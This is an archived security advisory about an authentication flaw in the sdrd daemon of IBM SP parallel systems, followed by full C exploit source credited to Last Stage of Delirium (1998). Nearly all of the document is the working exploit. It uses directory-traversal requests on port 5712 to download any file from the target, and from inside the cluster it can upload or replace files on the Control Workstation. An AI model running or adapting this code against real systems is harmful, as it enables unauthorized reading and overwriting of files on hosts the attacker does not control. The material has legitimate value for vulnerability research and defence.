source: http://www.securityfocus.com/bid/371/info


There is a vulnerability in the System Data Repository (SDR) subsystem. The SDR subsystem is used in IBM SP multi-machine parallel processing environments typically associated with Super Computing. The SDR is deisgned to allow multiple machines to share configuration and operational information. However, proper authentication is not in place in the SDR daemon 'sdrd', this allows un-authenticated users to arbitrarily pull any file off SDR hosts. 

/*## copyright LAST STAGE OF DELIRIUM oct 1998 poland        *://lsd-pl.net/ #*/
/*## sdrd                                                                    #*/

/*   remotely get/put and replace files on the IBM SP2 Control Workstation    */
/*   the get (-g) option works from any host, while the put/replace (-p/-r)   */
/*   options work only from within one of the SP2 nodes                       */
/*   the ifile denotes the source file for a given operation, ofile stands    */
/*   for the target filename                                                  */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

int getresponse(int sck,int *arg){
    char c,buffer[64],*b; 
    int i,res,*tab[2];

    tab[0]=&res;tab[1]=arg;
    for(i=0;i<2;i++){
        b=buffer;
        while(1){
            if(read(sck,&c,1)<0) {perror("error");exit(-1);}
            if(c==' ') break;
            *b++=c;
        }
        *b++=0;
        *tab[i]=atoi(buffer);
    }
    return(res);
}

main(int argc,char **argv){
    char buffer[10000],tmp[1024],*ifile,*ofile,*b,*p;
    int sck,i,c,arg,flag=-1,fd;
    struct sockaddr_in adr;
    struct hostent *hp;
    FILE *f; struct stat sbuf;

    printf("copyright LAST STAGE OF DELIRIUM oct 1998 poland  //lsd-pl.net/\n");
    printf("sdrd for aix 4.1 4.2 PowerPC/POWER\n\n");

    if(argc!=5){
        printf("usage: %s address -g|-p|-r ifile ofile\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"gpr"))!=-1){
        switch(c){
        case 'g': flag=1; break;
        case 'p': flag=2; break;
        case 'r': flag=3; break;
        default : exit(-1);
        }
    }
    if(flag==-1) exit(-1);

    ifile=argv[optind+1];
    ofile=argv[optind+2];

    sck=socket(AF_INET,SOCK_STREAM,0);
    adr.sin_family=AF_INET;
    adr.sin_port=htons(5712);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){
        perror("error");exit(-1);
    }

    switch(flag){
    case 1:
        printf("getting %s from %s\n",ifile,argv[1]);
        sprintf(tmp,"SDRFiles/../../../../../../../../../../../../..%s",ifile);
        sprintf(buffer,"3 %d %s",strlen(tmp),tmp);
        write(sck,buffer,strlen(buffer));
        if(getresponse(sck,&arg)){
            printf("error: no file %s:%s\n",argv[1],ifile);exit(-1);
        }
        if((fd=open(ofile,O_RDWR|O_CREAT,0600))<0){
            printf("error: create %s\n",ofile);exit(-1);
        }
        while(arg){
            if((i=read(sck,buffer,arg))<0) {perror("error");exit(-1);}   
            write(fd,buffer,i);
            arg-=i;
        } 
        break;
    case 2:
        printf("putting %s to %s:%s\n",ifile,argv[1],ofile);
        goto common;
    case 3:
        printf("replace %s:%s with %s\n",argv[1],ofile,ifile);
        goto common;

common:
        gethostname(tmp,sizeof(tmp));
        sprintf(buffer,"8 18 0 %s:%d:1",tmp,getpid());
        write(sck,buffer,strlen(buffer));
        if(getresponse(sck,&arg)){ 
            printf("error: auth\n");exit(-1);
        }
        if((fd=open(ifile,O_RDONLY))<0){
            printf("error: open %s\n",ifile);exit(-1);
        }
        fstat(fd,&sbuf);
        sprintf(tmp,"SDRFiles/../../../../../../../../../..%s",ofile);
        if(!(b=(char*)malloc(strlen(tmp)+sbuf.st_size+32))){
            printf("error: memory alloc");exit(-1);
        }
        if(flag==3) sprintf(b,"2 %d %s ",strlen(tmp)+sbuf.st_size,tmp);
        else sprintf(b,"19 %d %s ",strlen(tmp)+sbuf.st_size,tmp);
        p=b+strlen(b);
        arg=sbuf.st_size;
        while(arg){
            if((i=read(fd,p,arg))<0) {perror("error");exit(-1);}
            arg-=i;p+=i;
        }
        close(fd);
        *p=0;
        write(sck,b,strlen(b));
        if(flag==3) while(arg){
            if((i=read(sck,buffer,arg))<0) {perror("error");exit(-1);}
            arg-=i;
        }
        if(getresponse(sck,&arg)){ 
            printf("error: create %s:%s\n",argv[1],ofile);exit(-1);
        }
    }
    printf("ok!\n");
    close(fd);
}